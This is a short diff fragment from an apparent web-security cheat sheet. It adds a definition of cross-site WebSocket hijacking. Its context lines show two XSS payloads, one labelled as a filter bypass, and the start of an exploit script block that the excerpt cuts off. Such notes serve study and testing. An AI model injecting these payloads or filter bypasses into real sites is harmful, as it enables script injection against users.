@@ -2,6 +2,7 @@
     For XSS: <img src=1 onerror='alert(1)'>
     To bypass XSS filter: <img src=1 oNeRrOr=alert`1`>
 ### Cross-site WebSocket hijacking
+Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values. 
 ####  Exploit
 ```js
 <script>
